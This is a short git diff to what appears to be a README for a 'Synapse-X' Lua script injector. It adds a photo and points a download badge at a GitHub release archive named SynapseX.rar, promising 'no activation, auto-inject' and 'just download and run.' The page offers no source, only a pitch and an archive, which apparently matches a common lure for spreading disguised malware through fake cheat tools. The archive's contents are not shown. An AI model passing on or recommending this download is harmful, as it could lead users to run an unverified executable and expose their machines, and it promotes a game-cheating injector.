@@ -2,13 +2,15 @@
 ---
 
 
+![photo_2025-07-12_18-27-01](https://github.com/user-attachments/assets/3a3a88c7-3842-4ef7-a4f0-960e58465a63)
+
 
 ---
 🔧 Simple and fast Lua Injector. No activation, auto-inject, built-in script editor. Just download and run.
 
 ---
 <p align="center">
-  <a href="">
+  <a href="https://github.com/TomDev3x/Synapse-X/releases/tag/Download">
     <img src="https://img.shields.io/badge/DOWNLOAD-SynapseX.rar-0078D7?style=for-the-badge&logo=archive&logoColor=white&labelColor=28a745" alt="Download SynapseX.rar" />
   </a>
 </p>
